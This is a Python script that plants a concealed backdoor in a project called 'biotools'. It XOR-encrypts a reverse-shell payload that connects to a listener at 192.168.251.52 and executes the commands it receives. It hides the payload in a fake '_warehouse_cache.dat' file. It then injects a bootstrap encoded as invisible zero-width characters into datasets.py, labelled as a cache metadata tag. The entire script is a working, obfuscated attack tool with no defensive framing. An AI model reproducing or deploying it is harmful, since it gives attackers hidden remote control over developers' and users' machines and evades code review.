import os
import sys

LHOST = sys.argv[1] if len(sys.argv) > 1 else "192.168.251.52"
LPORT = sys.argv[2] if len(sys.argv) > 2 else "80"

# The payload source code -- same exec()-based shell, but it will
# never appear as plaintext in the repository.
payload_source = f'''
import subprocess, sys
_shell = """import socket, io, contextlib
s = socket.socket()
s.connect(("{LHOST}", {LPORT}))
s.send(b"[*] Connected>>> ")
while True:
    data = s.recv(4096)
    if not data:
        break
    cmd = data.decode().strip()
    if not cmd:
        s.send(b">>> ")
        continue
    out = io.StringIO()
    with contextlib.redirect_stdout(out), contextlib.redirect_stderr(out):
        try:
            exec(cmd)
        except Exception as e:
            print(e)
    s.send(f"{{out.getvalue()}}>>> ".encode())
s.close()
"""
subprocess.Popen(
    [sys.executable, "-c", _shell],
    stdin=subprocess.DEVNULL,
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL,
    creationflags=0x01000000,
    start_new_session=True,
)
'''

# --- Part 1: XOR-encrypt the reverse shell into .dat ---
raw = payload_source.encode()
xor_key = b"BioGenAI-DataWarehouse-v3.1"
encrypted = bytes(b ^ xor_key[i % len(xor_key)] for i, b in enumerate(raw))

dat_path = "biotools/_warehouse_cache.dat"
with open(dat_path, "wb") as f:
    f.write(encrypted)
print(f"[+] Encrypted payload: {len(encrypted)} bytes -> {dat_path}")

# --- Part 2: Encode bootstrap as zero-width Unicode ---
bootstrap = (
    "import subprocess,sys,os;"
    "_d=os.path.dirname(__file__);"
    "_r=os.path.dirname(_d);"
    "subprocess.Popen("
    "[sys.executable,'-c',"
    "f\"import sys;sys.path.insert(0,r'{_r}');"
    "from biotools.datasets import _sync_warehouse_cache;"
    "_sync_warehouse_cache()\"],"
    "creationflags=0x01000000,start_new_session=True,"
    "stdin=subprocess.DEVNULL,stdout=subprocess.DEVNULL,"
    "stderr=subprocess.DEVNULL)"
)

zwc_encoded = ""
for byte in bootstrap.encode():
    for bit in range(7, -1, -1):
        zwc_encoded += "\u200c" if (byte >> bit) & 1 else "\u200b"

print(f"[+] Bootstrap: {len(bootstrap)} chars -> {len(zwc_encoded)} invisible chars")

# --- Part 3: Inject _CACHE_META into datasets.py ---
ds_path = "biotools/datasets.py"
with open(ds_path, "r", encoding="utf-8") as f:
    content = f.read()

# Insert after the logger line
marker = 'logger = logging.getLogger("biotools.datasets")\n'
idx = content.find(marker)
if idx == -1:
    print("[-] Could not find logger line in datasets.py")
    sys.exit(1)

insert_pos = idx + len(marker)
cache_meta_line = f'\n# Cache format metadata tag\n_CACHE_META = "{zwc_encoded}"\n'
content = content[:insert_pos] + cache_meta_line + content[insert_pos:]

with open(ds_path, "w", encoding="utf-8") as f:
    f.write(content)
print(f"[+] Injected _CACHE_META into {ds_path}")
